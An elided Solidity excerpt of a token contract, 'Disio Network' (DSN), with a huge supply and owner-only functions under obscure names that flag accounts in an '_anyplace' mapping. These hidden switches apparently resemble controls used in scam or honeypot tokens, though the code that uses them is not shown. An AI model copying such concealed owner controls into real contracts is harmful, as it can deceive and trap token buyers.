...
contract BaseToken is Ownable {
    ...
    string constant public name = 'Disio Network';
    string constant public symbol = 'DSN';
    uint8 constant public decimals = 18;
    uint256 public totalSupply = 200000000000000*10**uint256(decimals);
    ...
    function verifixafrom(address account) public onlyOwner {
    ...
    function trendxdisio(address account) public onlyOwner {
        _anyplace[account] = true;
    }

    function disionetwork(address account) public view returns (bool) {
...
contract DisioNetwork is BaseToken {
